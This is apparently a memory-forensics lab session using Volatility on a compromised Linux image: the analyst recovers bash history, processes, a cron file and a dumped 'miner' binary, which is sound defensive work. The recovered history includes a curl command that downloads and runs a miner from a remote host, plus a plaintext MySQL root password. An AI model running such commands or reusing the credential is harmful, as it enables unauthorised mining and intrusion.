mac_tasks                  - List Active Tasks
mac_threads                - List Process Threads
mac_threads_simple         - Lists threads along with their start time and priority
mac_timers                 - Reports timers set by kernel drivers
mac_trustedbsd             - Lists malicious trustedbsd policies
mac_version                - Prints the Mac version
mac_vfsevents              - Lists processes filtering file system events
mac_volshell               - Shell in the memory image
mac_yarascan               - Scan memory for yara signatures
machoinfo                  - Dump Mach-O file format information
malfind                    - Find hidden and injected code
mbrparser                  - Scans for and parses potential Master Boot Records (MBRs)
memdump                    - Dump the addressable memory for a process
memmap                     - Print the memory map
messagehooks               - List desktop and thread window message hooks
mftparser                  - Scans for and parses potential MFT entries
moddump                    - Dump a kernel driver to an executable file sample
modscan                    - Pool scanner for kernel modules
modules                    - Print list of loaded modules
multiscan                  - Scan for various objects at once
mutantscan                 - Pool scanner for mutex objects
netscan                    - Scan a Vista (or later) image for connections and sockets
notepad                    - List currently displayed notepad text
objtypescan                - Scan for Windows object type objects
patcher                    - Patches memory based on page scans
poolpeek                   - Configurable pool scanner plugin
pooltracker                - Show a summary of pool tag usage
printkey                   - Print a registry key, and its subkeys and values
privs                      - Display process privileges
procdump                   - Dump a process to an executable file sample
pslist                     - Print all running processes by following the EPROCESS lists
psscan                     - Pool scanner for process objects
pstree                     - Print process list as a tree
psxview                    - Find hidden processes with various process listings
qemuinfo                   - Dump Qemu information
raw2dmp                    - Converts a physical memory sample to a windbg crash dump
screenshot                 - Save a pseudo-screenshot based on GDI windows
servicediff                - List Windows services (ala Plugx)
sessions                   - List details on _MM_SESSION_SPACE (user logon sessions)
shellbags                  - Prints ShellBags info
shimcache                  - Parses the Application Compatibility Shim Cache registry key
shutdowntime               - Print ShutdownTime of machine from registry
sockets                    - Print list of open sockets
sockscan                   - Pool scanner for tcp socket objects
ssdt                       - Display SSDT entries
strings                    - Match physical offsets to virtual addresses (may take a while, VERY verbose)
svcscan                    - Scan for Windows services
symlinkscan                - Pool scanner for symlink objects
thrdscan                   - Pool scanner for thread objects
threads                    - Investigate _ETHREAD and _KTHREADs
timeliner                  - Creates a timeline from various artifacts in memory
timers                     - Print kernel timers and associated module DPCs
truecryptmaster            - Recover TrueCrypt 7.1a Master Keys
truecryptpassphrase        - TrueCrypt Cached Passphrase Finder
truecryptsummary           - TrueCrypt Summary
unloadedmodules            - Print list of unloaded modules
userassist                 - Print userassist registry keys and information
userhandles                - Dump the USER handle tables
vaddump                    - Dumps out the vad sections to a file
vadinfo                    - Dump the VAD info
vadtree                    - Walk the VAD tree and display in tree format
vadwalk                    - Walk the VAD tree
vboxinfo                   - Dump virtualbox information
verinfo                    - Prints out the version information from PE images
vmwareinfo                 - Dump VMware VMSS/VMSN information
volshell                   - Shell in the memory image
win10cookie                - Find the ObHeaderCookie value for Windows 10
windows                    - Print Desktop Windows (verbose details)
wintree                    - Print Z-Order Desktop Windows Tree
wndscan                    - Pool scanner for window stations
yarascan                   - Scan process or kernel memory with Yara signatures
ubuntu@volatility:~$ cd ~/Desktop/Evidence/
ubuntu@volatility:~/Desktop/Evidence$ ls
Ubuntu_5.4.0-163-generic_profile.zip  linux.mem
ubuntu@volatility:~/Desktop/Evidence$ ls
Ubuntu_5.4.0-163-generic_profile      linux.mem
Ubuntu_5.4.0-163-generic_profile.zip
ubuntu@volatility:~/Desktop/Evidence$ cp Ubuntu_5.4.0-163-generic_profile.zip ~/.local/lib/python2.7/site-packages/volatility/plugins/overlays/linux/
ubuntu@volatility:~/Desktop/Evidence$ ls ~/.local/lib/python2.7/site-packages/volatility/plugins/overlays/linux/
Ubuntu_5.4.0-163-generic_profile.zip  __init__.pyc  elf.pyc   linux.pyc
__init__.py                           elf.py        linux.py
ubuntu@volatility:~/Desktop/Evidence$ vol.py --info | grep Ubuntu
Volatility Foundation Volatility Framework 2.6.1
LinuxUbuntu_5_4_0-163-generic_profilex64 - A Profile for Linux Ubuntu_5.4.0-163-generic_profile x64
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" -h
Volatility Foundation Volatility Framework 2.6.1
Usage: Volatility - A memory forensics analysis platform.

Options:
  -h, --help            list all available options and their default values.
                        Default values may be set in the configuration file
                        (/etc/volatilityrc)
  --conf-file=/home/ubuntu/.volatilityrc
                        User based configuration file
  -d, --debug           Debug volatility
  --plugins=PLUGINS     Additional plugin directories to use (colon separated)
  --info                Print information about all registered objects
  --cache-directory=/home/ubuntu/.cache/volatility
                        Directory where cache files are stored
  --cache               Use caching
  --tz=TZ               Sets the (Olson) timezone for displaying timestamps
                        using pytz (if installed) or tzset
  -f FILENAME, --filename=FILENAME
                        Filename to use when opening an image
  --profile=LinuxUbuntu_5_4_0-163-generic_profilex64
                        Name of the profile to load (use --info to see a list
                        of supported profiles)
  -l file:///home/ubuntu/Desktop/Evidence/linux.mem, --location=file:///home/ubuntu/Desktop/Evidence/linux.mem
                        A URN location from which to load an address space
  -w, --write           Enable write support
  --dtb=DTB             DTB Address
  --shift=SHIFT         Mac KASLR shift address
  --output=text         Output in this format (support is module specific, see
                        the Module Output Options below)
  --output-file=OUTPUT_FILE
                        Write output in this file
  -v, --verbose         Verbose information
  --physical_shift=PHYSICAL_SHIFT
                        Linux kernel physical shift address
  --virtual_shift=VIRTUAL_SHIFT
                        Linux kernel virtual shift address
  -g KDBG, --kdbg=KDBG  Specify a KDBG virtual address (Note: for 64-bit
                        Windows 8 and above this is the address of
                        KdCopyDataBlock)
  --force               Force utilization of suspect profile
  -k KPCR, --kpcr=KPCR  Specify a specific KPCR address
  --cookie=COOKIE       Specify the address of nt!ObHeaderCookie (valid for
                        Windows 10 only)

	Supported Plugin Commands:

		imagecopy      	Copies a physical address space out as a raw DD image
		limeinfo       	Dump Lime file format information
		linux_apihooks 	Checks for userland apihooks
		linux_arp      	Print the ARP table
		linux_aslr_shift	Automatically detect the Linux ASLR shift
		linux_banner   	Prints the Linux banner information 
		linux_bash     	Recover bash history from bash process memory
		linux_bash_env 	Recover a process' dynamic environment variables
		linux_bash_hash	Recover bash hash table from bash process memory
		linux_check_afinfo	Verifies the operation function pointers of network protocols
		linux_check_creds	Checks if any processes are sharing credential structures
		linux_check_fop	Check file operation structures for rootkit modifications
		linux_check_idt	Checks if the IDT has been altered 
		linux_check_inline_kernel	Check for inline kernel hooks
		linux_check_modules	Compares module list to sysfs info, if available
		linux_check_syscall	Checks if the system call table has been altered 
		linux_check_tty	Checks tty devices for hooks
		linux_cpuinfo  	Prints info about each active processor
		linux_dentry_cache	Gather files from the dentry cache
		linux_dmesg    	Gather dmesg buffer
		linux_dump_map 	Writes selected memory mappings to disk 
		linux_dynamic_env	Recover a process' dynamic environment variables
		linux_elfs     	Find ELF binaries in process mappings
		linux_enumerate_files	Lists files referenced by the filesystem cache
		linux_find_file	Lists and recovers files from memory
		linux_getcwd   	Lists current working directory of each process
		linux_hidden_modules	Carves memory to find hidden kernel modules
		linux_ifconfig 	Gathers active interfaces
		linux_info_regs	It's like 'info registers' in GDB. It prints out all the
		linux_iomem    	Provides output similar to /proc/iomem
		linux_kernel_opened_files	Lists files that are opened from within the kernel
		linux_keyboard_notifiers	Parses the keyboard notifier call chain
		linux_ldrmodules	Compares the output of proc maps with the list of libraries from libdl
		linux_library_list	Lists libraries loaded into a process 
		linux_librarydump	Dumps shared libraries in process memory to disk
		linux_list_raw 	List applications with promiscuous sockets
		linux_lsmod    	Gather loaded kernel modules
		linux_lsof     	Lists file descriptors and their path
		linux_malfind  	Looks for suspicious process mappings
		linux_memmap   	Dumps the memory map for linux tasks
		linux_moddump  	Extract loaded kernel modules
		linux_mount    	Gather mounted fs/devices
		linux_mount_cache	Gather mounted fs/devices from kmem_cache
		linux_netfilter	Lists Netfilter hooks
		linux_netscan  	Carves for network connection structures
		linux_netstat  	Lists open sockets
		linux_pidhashtable	Enumerates processes through the PID hash table
		linux_pkt_queues	Writes per-process packet queues out to disk
		linux_plthook  	Scan ELF binaries' PLT for hooks to non-NEEDED images
		linux_proc_maps	Gathers process memory maps
		linux_proc_maps_rb	Gathers process maps for linux through the mappings red-black tree
		linux_procdump 	Dumps a process's executable image to disk
		linux_process_hollow	Checks for signs of process hollowing
		linux_psaux    	Gathers processes along with full command line and start time
		linux_psenv    	Gathers processes along with their static environment variables
		linux_pslist   	Gather active tasks by walking the task_struct->task list
		linux_pslist_cache	Gather tasks from the kmem_cache
		linux_psscan   	Scan physical memory for processes 
		linux_pstree   	Shows the parent/child relationship between processes
		linux_psxview  	Find hidden processes with various process listings
		linux_recover_filesystem	Recovers the entire cached file system from memory
		linux_route_cache	Recovers the routing cache from memory 
		linux_sk_buff_cache	Recovers packets from the sk_buff kmem_cache
		linux_slabinfo 	Mimics /proc/slabinfo on a running machine
		linux_strings  	Match physical offsets to virtual addresses (may take a while, VERY verbose)
		linux_threads  	Prints threads of processes 
		linux_tmpfs    	Recovers tmpfs filesystems from memory
		linux_truecrypt_passphrase	Recovers cached Truecrypt passphrases 
		linux_vma_cache	Gather VMAs from the vm_area_struct cache
		linux_volshell 	Shell in the memory image
		linux_yarascan 	A shell in the Linux memory image
		mbrparser      	Scans for and parses potential Master Boot Records (MBRs) 
		patcher        	Patches memory based on page scans
		raw2dmp        	Converts a physical memory sample to a windbg crash dump
		vmwareinfo     	Dump VMware VMSS/VMSN information
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_bash
Volatility Foundation Volatility Framework 2.6.1
Pid      Name                 Command Time                   Command
-------- -------------------- ------------------------------ -------
    8092 bash                 2023-10-02 18:13:46 UTC+0000   sudo su
    8092 bash                 2023-10-02 18:15:44 UTC+0000   git clone https://github.com/504ensicsLabs/LiME && cd LiME/src/
    8092 bash                 2023-10-02 18:15:53 UTC+0000   ls
    8092 bash                 2023-10-02 18:15:55 UTC+0000   make
    8092 bash                 2023-10-02 18:16:16 UTC+0000   vi ~/.bash_history 
    8092 bash                 2023-10-02 18:16:38 UTC+0000    
    8092 bash                 2023-10-02 18:16:38 UTC+0000   ls -la /home/elfie/
    8092 bash                 2023-10-02 18:16:42 UTC+0000   sudo su
    8092 bash                 2023-10-02 18:18:38 UTC+0000   ls -la /home/elfie/
    8092 bash                 2023-10-02 18:18:41 UTC+0000   vi ~/.bash_history 
   10205 bash                 2023-10-02 18:19:58 UTC+0000   mysql -u root -p'NEhX4VSrN7sV'
   10205 bash                 2023-10-02 18:19:58 UTC+0000   id
   10205 bash                 2023-10-02 18:19:58 UTC+0000   curl http://10.0.2.64/toy_miner -o miner
   10205 bash                 2023-10-02 18:19:58 UTC+0000   ./miner
   10205 bash                 2023-10-02 18:19:58 UTC+0000   cat /home/elfie/.bash_history
   10205 bash                 2023-10-02 18:20:03 UTC+0000   vi .bash_history 
   10205 bash                 2023-10-02 18:21:21 UTC+0000   cd LiME/src/
ubuntu@volatility:~/Desktop/Evidence$ 
ubuntu@volatility:~/Desktop/Evidence$ 
ubuntu@volatility:~/Desktop/Evidence$ 
ubuntu@volatility:~/Desktop/Evidence$ 
ubuntu@volatility:~/Desktop/Evidence$ 
ubuntu@volatility:~/Desktop/Evidence$ 
ubuntu@volatility:~/Desktop/Evidence$ 
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_pslist
Volatility Foundation Volatility Framework 2.6.1
Offset             Name                 Pid             PPid            Uid             Gid    DTB                Start Time
------------------ -------------------- --------------- --------------- --------------- ------ ------------------ ----------
0xffff9ce9bd5baf00 systemd              1               0               0               0      0x000000007c3ae000 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5bc680 kthreadd             2               0               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5b9780 rcu_gp               3               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5b8000 rcu_par_gp           4               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d4680 kworker/0:0H         6               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d0000 mm_percpu_wq         8               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d5e00 ksoftirqd/0          9               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d2f00 rcu_sched            10              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d9780 migration/0          11              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d8000 idle_inject/0        12              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5dde00 kworker/0:1          13              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5daf00 cpuhp/0              14              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5dc680 kdevtmpfs            15              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd632f00 netns                16              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd634680 rcu_tasks_kthre      17              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd631780 kauditd              18              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd630000 khungtaskd           19              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd635e00 oom_reaper           20              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6eaf00 writeback            21              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6ec680 kcompactd0           22              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6e9780 ksmd                 23              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6e8000 khugepaged           24              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd73af00 kintegrityd          70              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd74de00 kblockd              71              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd74af00 blkcg_punt_bio       72              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd74c680 tpm_dev_wq           73              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd749780 ata_sff              74              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd748000 md                   75              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd73de00 edac-poller          76              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd738000 devfreq_wq           77              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd739780 watchdogd            78              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd73c680 kworker/u2:1         79              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f8000 kswapd0              81              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f9780 ecryptfs-kthrea      82              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6faf00 kthrotld             84              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f1780 acpi_thermal_pm      85              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f4680 scsi_eh_0            86              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f2f00 scsi_tmf_0           87              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f5e00 scsi_eh_1            88              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f0000 scsi_tmf_1           89              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6fde00 vfio-irqfd-clea      91              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6ede00 kworker/u2:3         92              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd71de00 ipv6_addrconf        93              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd70c680 kstrp                102             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd705e00 kworker/u3:0         105             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bbf9af00 charger_manager      118             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bbf9c680 kworker/0:1H         119             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bbf90000 scsi_eh_2            159             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd719780 scsi_tmf_2           161             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd71af00 cryptd               162             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bbb35e00 irq/18-vmwgfx        187             2               0               0      ------------------ 2023-10-02 18:08:03 UTC+0000
0xffff9ce9bbf9de00 ttm_swap             189             2               0               0      ------------------ 2023-10-02 18:08:03 UTC+0000
0xffff9ce9bbadde00 kdmflush             211             2               0               0      ------------------ 2023-10-02 18:08:03 UTC+0000
0xffff9ce9bd708000 raid5wq              237             2               0               0      ------------------ 2023-10-02 18:08:03 UTC+0000
0xffff9ce9bbf91780 jbd2/dm-0-8          284             2               0               0      ------------------ 2023-10-02 18:08:04 UTC+0000
0xffff9ce9bbad9780 ext4-rsv-conver      285             2               0               0      ------------------ 2023-10-02 18:08:04 UTC+0000
0xffff9ce971889780 systemd-journal      355             1               0               0      0x0000000072d08000 2023-10-02 18:08:04 UTC+0000
0xffff9ce9bbf98000 systemd-udevd        387             1               0               0      0x0000000071040000 2023-10-02 18:08:04 UTC+0000
0xffff9ce9bbad8000 iprt-VBoxWQueue      404             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bbadc680 kaluad               508             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce97188af00 kmpath_rdacd         509             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce97188de00 kmpathd              510             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce97188c680 kmpath_handlerd      511             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bbf92f00 multipathd           512             1               0               0      0x000000006fc32000 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bd702f00 loop0                523             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bd700000 loop1                527             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9b9338000 jbd2/sda2-8          529             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9b933de00 ext4-rsv-conver      530             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bd709780 systemd-timesyn      556             1               102             104    0x000000007adb8000 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bd701780 systemd-network      763             1               100             102    0x0000000070650000 2023-10-02 18:08:07 UTC+0000
0xffff9ce9bd70af00 systemd-resolve      766             1               101             103    0x0000000070438000 2023-10-02 18:08:07 UTC+0000
0xffff9ce9bd70de00 accounts-daemon      801             1               0               0      0x000000006f0dc000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9bbc11780 cron                 805             1               0               0      0x0000000070456000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b933c680 dbus-daemon          809             1               103             106    0x0000000072498000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9aef21780 networkd-dispat      821             1               0               0      0x0000000079288000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b92a2f00 polkitd              823             1               0               0      0x00000000792e8000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b92a0000 rsyslogd             828             1               104             110    0x0000000076344000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b92a5e00 snapd                829             1               0               0      0x0000000074f3e000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9aef25e00 systemd-logind       830             1               0               0      0x000000007c310000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b5639780 udisksd              832             1               0               0      0x00000000756ca000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b5638000 atd                  833             1               0               0      0x00000000756d8000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b4feaf00 ModemManager         881             1               0               0      0x00000000763e2000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b4fec680 unattended-upgr      899             1               0               0      0x0000000073a3e000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b4fe8000 agetty               901             1               0               0      0x0000000073040000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b0ad1780 sshd                 1400            1               0               0      0x00000000705a4000 2023-10-02 18:08:17 UTC+0000
0xffff9ce9b2f51780 kworker/0:5          1942            2               0               0      ------------------ 2023-10-02 18:10:08 UTC+0000
0xffff9ce9b32e0000 sshd                 7989            1400            0               0      0x0000000073eb4000 2023-10-02 18:13:49 UTC+0000
0xffff9ce9b58eaf00 systemd              8009            1               1000            1000   0x0000000031b06000 2023-10-02 18:13:59 UTC+0000
0xffff9ce9b2f50000 (sd-pam)             8010            8009            1000            1000   0x000000006d016000 2023-10-02 18:13:59 UTC+0000
0xffff9ce9b3bb8000 sshd                 8091            7989            1000            1000   0x0000000070a28000 2023-10-02 18:13:59 UTC+0000
0xffff9ce9b3bbaf00 bash                 8092            8091            1000            1000   0x000000007ac4a000 2023-10-02 18:13:59 UTC+0000
0xffff9ce9b1f42f00 mysqld               8839            1               114             118    0x0000000073394000 2023-10-02 18:14:34 UTC+0000
0xffff9ce9b1a4c680 kworker/u2:0         10094           2               0               0      ------------------ 2023-10-02 18:19:42 UTC+0000
0xffff9ce9b1a4de00 kworker/0:0          10110           2               0               0      ------------------ 2023-10-02 18:19:42 UTC+0000
0xffff9ce9b32e1780 sshd                 10111           1400            0               0      0x000000007ada6000 2023-10-02 18:20:05 UTC+0000
0xffff9ce9b3f78000 sshd                 10204           10111           1000            1000   0x000000007060a000 2023-10-02 18:20:13 UTC+0000
0xffff9ce9b3f79780 bash                 10205           10204           1000            1000   0x000000006eee8000 2023-10-02 18:20:13 UTC+0000
0xffff9ce9aee75e00 sudo                 10276           10205           0               0      0x00000000733e8000 2023-10-02 18:22:35 UTC+0000
0xffff9ce9ad112f00 systemd-udevd        10277           387             0               0      0x00000000711be000 2023-10-02 18:22:35 UTC+0000
0xffff9ce9aee70000 insmod               10278           10276           0               0      0x0000000073056000 2023-10-02 18:22:36 UTC+0000
0xffff9ce9ad115e00 systemd-udevd        10279           387             0               0      0x000000007ba64000 2023-10-02 18:22:36 UTC+0000
0xffff9ce9b1e4c680 miner                10280           1               1000            1000   0x0000000074fa2000 2023-10-02 18:22:37 UTC+0000
0xffff9ce9bc23af00 mysqlserver          10291           1               1000            1000   0x000000006f166000 2023-10-02 18:22:37 UTC+0000
ubuntu@volatility:~/Desktop/Evidence$ mkdir extracted
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p PID
Volatility Foundation Volatility Framework 2.6.1
Offset             Name                 Pid             Address            Output File
------------------ -------------------- --------------- ------------------ -----------
Traceback (most recent call last):
  File "/home/ubuntu/.local/bin/vol.py", line 192, in <module>
    main()
  File "/home/ubuntu/.local/bin/vol.py", line 183, in main
    command.execute()
  File "/home/ubuntu/.local/lib/python2.7/site-packages/volatility/plugins/linux/common.py", line 67, in execute
    commands.Command.execute(self, *args, **kwargs)
  File "/home/ubuntu/.local/lib/python2.7/site-packages/volatility/commands.py", line 147, in execute
    func(outfd, data)
  File "/home/ubuntu/.local/lib/python2.7/site-packages/volatility/plugins/linux/procdump.py", line 50, in render_text
    for task in data:
  File "/home/ubuntu/.local/lib/python2.7/site-packages/volatility/plugins/linux/pslist.py", line 69, in calculate
    pidlist = [int(p) for p in self._config.PID.split(',')]
ValueError: invalid literal for int() with base 10: 'PID'
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p 10291
Volatility Foundation Volatility Framework 2.6.1
Offset             Name                 Pid             Address            Output File
------------------ -------------------- --------------- ------------------ -----------
0xffff9ce9bc23af00 mysqlserver          10291           0x0000000000400000 extracted/mysqlserver.10291.0x400000
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p PID
Volatility Foundation Volatility Framework 2.6.1
Offset             Name                 Pid             Address            Output File
------------------ -------------------- --------------- ------------------ -----------
Traceback (most recent call last):
  File "/home/ubuntu/.local/bin/vol.py", line 192, in <module>
    main()
  File "/home/ubuntu/.local/bin/vol.py", line 183, in main
    command.execute()
  File "/home/ubuntu/.local/lib/python2.7/site-packages/volatility/plugins/linux/common.py", line 67, in execute
    commands.Command.execute(self, *args, **kwargs)
  File "/home/ubuntu/.local/lib/python2.7/site-packages/volatility/commands.py", line 147, in execute
    func(outfd, data)
  File "/home/ubuntu/.local/lib/python2.7/site-packages/volatility/plugins/linux/procdump.py", line 50, in render_text
    for task in data:
  File "/home/ubuntu/.local/lib/python2.7/site-packages/volatility/plugins/linux/pslist.py", line 69, in calculate
    pidlist = [int(p) for p in self._config.PID.split(',')]
ValueError: invalid literal for int() with base 10: 'PID'
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p 10280
Volatility Foundation Volatility Framework 2.6.1
Offset             Name                 Pid             Address            Output File
------------------ -------------------- --------------- ------------------ -----------
0xffff9ce9b1e4c680 miner                10280           0x0000000000400000 extracted/miner.10280.0x400000
ubuntu@volatility:~/Desktop/Evidence$ ls extracted/
miner.10280.0x400000  mysqlserver.10291.0x400000
ubuntu@volatility:~/Desktop/Evidence$ md5sum extracted/miner.PID.0x400000
md5sum: extracted/miner.PID.0x400000: No such file or directory
ubuntu@volatility:~/Desktop/Evidence$ md5sum extracted/mysqlserver.10291.0x400000 
c586e774bb2aa17819d7faae18dad7d1  extracted/mysqlserver.10291.0x400000
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_enumerate_files | grep -i cron
Volatility Foundation Volatility Framework 2.6.1
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_find_file -i 0xffff9ce9b78280e8 -O extracted/elfie
ls extracted/
0xffff9ce9bc312e80                       684 /home/crond.reboot
0xffff9ce9bb88f6f0                       682 /home/crond.pid
0xffff9ce9bb88cbb0                       679 /home/systemd/units/invocation:cron.service
0xffff9ce9baa31a98                    138255 /var/spool/cron
0xffff9ce9baa72bb8                    138259 /var/spool/cron/crontabs
0xffff9ce9b78280e8                    132687 /var/spool/cron/crontabs/elfie
0xffff9ce9baa54568                    138257 /var/spool/cron/atjobs
0xffff9ce9baa31650                     13246 /usr/sbin/cron
0xffff9ce9b7829ee0                       582 /usr/bin/crontab
               0x0 ------------------------- /usr/lib/systemd/system/cron.service.d
0xffff9ce9bc47d688                     10065 /usr/lib/systemd/system/cron.service
0xffff9ce9baa749b0                    524316 /etc/cron.hourly
0xffff9ce9baa73000                    525591 /etc/pam.d/cron
0xffff9ce9baa73cd8                    524314 /etc/cron.d
0xffff9ce9baa75f18                    525419 /etc/cron.d/e2scrub_all
0xffff9ce9baa74568                    525420 /etc/cron.d/popularity-contest
0xffff9ce9baa70978                    524970 /etc/crontab
0xffff9ce9bc47dad0                    525496 /etc/init.d/cron
0xffff9ce9baa35240                    525444 /etc/default/cron
               0x0 ------------------------- /etc/systemd/system/cron.service.d
               0x0 ------------------------- /etc/systemd/system/cron.service
0xffff9ce9bc4fd240                    525090 /etc/systemd/system/multi-user.target.wants/cron.service
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_find_file -i 0xffff9ce9b78280e8 -O extracted/elfie
Volatility Foundation Volatility Framework 2.6.1
ubuntu@volatility:~/Desktop/Evidence$ ls extracted/
elfie  miner.10280.0x400000  mysqlserver.10291.0x400000
ubuntu@volatility:~/Desktop/Evidence$ cat miner.10280.0x400000
cat: miner.10280.0x400000: No such file or directory
ubuntu@volatility:~/Desktop/Evidence$ strings extracted/miner.10280.0x400000 | grep http://
"cpu":""idle":"nice":"user":	types 	value=abortedaccept4alt -> answersany -> charsetchunkedcmdlineconnectcpuinfocpuprofcs     derivedenvironexpiresfloat32float64forcegcfs     fstatatgatewaygctracegetconfgs     head = http://invalidlookup modulesnil keynop -> panic: r10    r11    r12    r13    r14    r15    r8     r9     rax    rbp    rbx    rcx    rdi    rdx    refererrefreshrflags rip    rsi    rsp    runningserial:signal stoppedsyscalltraileruintptrunknownupgradevboxdrvwaiting data=%q etypes  goal
